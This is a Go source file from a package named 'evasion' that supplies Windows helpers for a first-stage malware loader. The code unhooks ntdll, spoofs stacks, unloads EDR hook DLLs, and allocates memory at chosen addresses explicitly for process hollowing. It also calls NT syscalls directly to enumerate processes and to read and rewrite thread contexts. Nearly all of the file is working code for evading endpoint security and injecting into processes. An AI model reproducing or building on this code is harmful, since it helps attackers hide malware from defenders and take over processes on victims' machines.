//go:build windows
// +build windows

package evasion

import "unsafe"

// InitLoader applies evasion techniques safe for a first-stage loader process:
// ntdll unhooking, stack-spoof buffer init, and unloading of EDR hook DLLs.
// Call before any NT syscall in the loader.
func InitLoader() {
	unhookNtdll()
	initSpoofing()
	unloadEDRDLLs()
}

// NtAllocateVirtualMemoryAt allocates memory in processHandle starting at baseHint
// (pass 0 to let the kernel choose). Unlike NtAllocateVirtualMemory, this variant
// accepts a preferred base address for use in process-hollowing allocation.
func NtAllocateVirtualMemoryAt(processHandle, baseHint, size uintptr, protect uint32) uintptr {
	p := getNtAllocProc()
	if p == nil {
		return 0
	}
	base := baseHint
	const memCommitReserve = 0x3000
	r, _, _ := p.Call(
		processHandle,
		uintptr(unsafe.Pointer(&base)),
		0,
		uintptr(unsafe.Pointer(&size)),
		memCommitReserve,
		uintptr(protect),
	)
	if r != 0 {
		return 0
	}
	return base
}

// NtGetNextProcess enumerates process handles via a direct NtGetNextProcess syscall,
// replacing CreateToolhelp32Snapshot / Process32First / Process32Next.
// Pass prev=0 to start enumeration; pass the previous returned handle to advance.
// Returns 0 when enumeration is complete. The caller is responsible for closing
// every returned handle (including the final 0 check — close prev before breaking).
func NtGetNextProcess(prev uintptr, accessMask uint32) uintptr {
	p := getNtGetNextProcessProc()
	if p == nil {
		return 0
	}
	var next uintptr
	r, _, _ := p.Call(prev, uintptr(accessMask), 0, 0, uintptr(unsafe.Pointer(&next)))
	if r != 0 {
		return 0
	}
	return next
}

// NtGetContextThread retrieves the CPU context of a thread via a direct
// NtGetContextThread syscall (replaces kernel32!GetThreadContext).
func NtGetContextThread(threadHandle uintptr, context unsafe.Pointer) bool {
	p := getNtGetContextThreadProc()
	if p == nil {
		return false
	}
	r, _, _ := p.Call(threadHandle, uintptr(context))
	return r == 0
}

// NtSetContextThread sets the CPU context of a thread via a direct
// NtSetContextThread syscall (replaces kernel32!SetThreadContext).
func NtSetContextThread(threadHandle uintptr, context unsafe.Pointer) bool {
	p := getNtSetContextThreadProc()
	if p == nil {
		return false
	}
	r, _, _ := p.Call(threadHandle, uintptr(context))
	return r == 0
}

// ProcessPID returns the PID of processHandle via NtQueryInformationProcess.
// Returns 0 on failure.
func ProcessPID(processHandle uintptr) uint32 {
	p := getNtQueryProcessProc()
	if p == nil {
		return 0
	}
	var pbi [6]uintptr // sizeof(PROCESS_BASIC_INFORMATION) on x64 = 48 bytes
	var retLen uint32
	r, _, _ := p.Call(
		processHandle,
		0, // ProcessBasicInformation
		uintptr(unsafe.Pointer(&pbi[0])),
		uintptr(unsafe.Sizeof(pbi)),
		uintptr(unsafe.Pointer(&retLen)),
	)
	if r != 0 {
		return 0
	}
	return uint32(pbi[4]) // UniqueProcessId at offset 0x20
}
